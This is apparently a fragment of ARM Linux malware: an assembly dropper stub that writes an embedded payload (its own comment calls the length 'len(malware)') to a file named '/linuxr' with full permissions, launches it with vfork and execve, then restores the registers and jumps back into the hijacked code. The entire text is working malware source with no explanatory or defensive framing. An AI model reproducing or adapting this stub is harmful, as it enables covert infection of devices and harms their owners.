step3:
	mov r0,r0
	mov r0,r0
	mov r0,r0
	mov r0,r0

Point0:
	sub r4, pc, #Point0
	sub r4, r4, #8
	add r0, r4, #filename       @ locate absolute addr of `filename`

	mov r1, #66
	mov r2, #255
	add r2, r2, #255
	add r2, r2, #1
	mov r7, #5
	swi 0x900005                @ syscall of open()
	stmfd sp!, {r0}
Point1:
	sub r4, pc, #Point1
	sub r4, r4, #8
	add r1, r4, #Buffer         @ locate absolute addr of `buffer`, where shellcode is stored
	add r2, r4, #para           @ locate absolute addr of `para`
	ldr r2, [r2]                @ para[0] stores size of shellcode
	mov r7, #4
	swi 0x900004                @ syscall of write()
	ldmfd sp!, {r0}

	mov r7, #6
	swi 0x900006                @ syscall of close()

	mov r7, #0xbe
	swi	0x009000be              @ syscall of vfork()
	cmp r0, #0
	bne PidNoZero               @ jump to parent process

Point2:
	sub r4, pc, #Point2
	sub r4, r4, #8
	add r0, r4, #filename       @ locate absolute addr of `filename`
	mov r1, #0
	mov r2, #0
	mov r7, #11
	swi 0x90000b                @ syscall of execve()

PidNoZero:
	ldmfd sp!, {r6}
	msr spsr, r6
	ldmfd sp!, {r6}
	msr cpsr, r6
	ldmfd sp!, {r0-r12, lr}

	ldr pc, [pc]

para:
	.word 0x1eb4     @len(malware)  modify
    .word 0xc0030680 @syscall_execve_wrapper modify

filename:
    .ascii "/linuxr\x00"
    .align


Buffer: